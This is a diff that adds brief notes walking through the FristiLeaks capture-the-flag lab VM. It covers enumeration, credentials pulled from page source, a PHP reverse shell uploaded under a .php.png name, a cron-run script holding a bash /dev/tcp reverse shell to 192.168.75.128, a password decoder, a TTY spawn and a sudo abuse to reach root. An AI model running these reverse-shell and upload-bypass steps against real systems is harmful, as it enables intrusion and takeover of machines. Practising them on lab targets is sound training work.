@@ -1,0 +1,75 @@
+1.Enumenation
+nmap, nikto, dirb
+
+#we found in robots.txt directories /cola , /beer , /sisi
+#we can guest our directories is /fristi
+
+2. Go inside
+#view-sourcecode
+#we found name - eezeepz
+#and after some manipulations (decoding) password - keKkeKKeKKeKkEkkEk
+log in
+
+3. Create shell
+#get simple reverse-php-shell from pentersrmonkey
+https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+#tune and change name - shell.php.png
+#upload
+#start ncat and go to link <ip>/fristi/uploads/shell.php.png
+
+4. Privelegies escalation
+#found 
+/home/eezeepz/notes.txt
+#this means every minute scripts /tmp/runthis runs under privilegies admin
+#create script
+echo "/usr/bin/dir && /bin/bash -i >& bash -i >& /dev/tcp/192.168.75.128/5555 0>&1" > /tmp/runthis
+#from localmashine catch connection on 5555 port
+
+
+#we inside under previlegies admin
+
+5. Escalation part2
+
+#go to ~
+#we see cryprpass.py and whoisyourgodnow.txt
+#first file is a crypro script
+#second file is a result of crypt
+#we need decrypt
+#after analysis script we create tecrypting script
+
+
+
+import base64,codecs,sys
+
+def encodeString(str):
+    base64string= base64.b64encode(str)
+    return codecs.encode(base64string[::-1], 'rot13')
+
+def decodeString(str):
+    string = str[::-1]
+    string = string.encode("rot13")
+    return base64.b64decode(string)
+
+print decodeString(sys.argv[1])
+
+
+
+#decrypt whoisyourgodnow.txt
+#we get passord to fristigod - LetThereBeFristi!
+#print - su i
+# get - standard in must be a tty
+# we need Spawning a TTY Shell https://netsec.ws/?p=337
+python -c 'import pty; pty.spawn("/bin/sh")'
+su - fristigod
+
+# we forund /var/fristigod/.secret_admin_stuff/doCom
+#try to run .doCom
+Nice try, but wrong user ;)
+#try other users
+sudo -u fristi ./doCom whoami
+#correct
+sudo -u fristi ./doCom /bin/bash
+
+#root
+#flag
+cat /root/fristileaks_secrets.txt
